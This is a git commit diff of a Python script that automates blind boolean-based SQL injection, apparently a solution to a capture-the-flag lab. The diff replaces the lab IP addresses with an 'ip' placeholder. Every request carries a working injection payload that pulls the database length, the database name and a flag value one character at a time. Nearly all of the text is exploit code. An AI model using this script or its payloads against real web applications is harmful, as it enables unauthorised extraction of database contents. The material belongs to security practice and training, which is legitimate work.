856a564085addf11e6cc466dfba591b9a5087218
Elmar <61630050+c3linux@users.noreply.github.com>
2021-12-11 15:21:15 +0400

    Update sqli-boolean-based.py

--- sqli-boolean-based.py
+++ sqli-boolean-based.py
@@ -5,7 +5,7 @@ def database_name():
     count=1
     for i in range(8):
         for a in range(48,126):
-            req=requests.get(url=f"http://10.10.79.117/register/user-check?username=admin' AND (ASCII(SUBSTR((select database()),{count},1))) = {a} --+")          
+            req=requests.get(url=f"ip/user-check?username=admin' AND (ASCII(SUBSTR((select database()),{count},1))) = {a} --+")          
             if 'false' in req.text:
                 flag+=chr(a)
                 count+=1
@@ -15,7 +15,7 @@ def database_name():
 
 def database_length(): 
     for i in range(100):
-        req=requests.get(url=f"http://10.10.103.240/register/user-check?username=admin%27%20AND%20(length(database()))%20=%20{i}%20--+;")
+        req=requests.get(url=f"http://ip/register/user-check?username=admin%27%20AND%20(length(database()))%20=%20{i}%20--+;")
         if 'false' in req.text:
             print(f"database length is {i}")
         else:
@@ -27,7 +27,7 @@ def flag_value():
     count=1
     while chr(125) not in flag:
         for a in range(48,126):
-            req=requests.get(url=f"http://10.10.79.117/register/user-check?username=admin' AND (ASCII(SUBSTR((select flag from sqhell_3.flag),{count},1))) = {a} --+")          
+            req=requests.get(url=f"http://ip/register/user-check?username=admin' AND (ASCII(SUBSTR((select flag from sqhell_3.flag),{count},1))) = {a} --+")          
             if 'false' in req.text:
                 flag+=chr(a)
                 count+=1
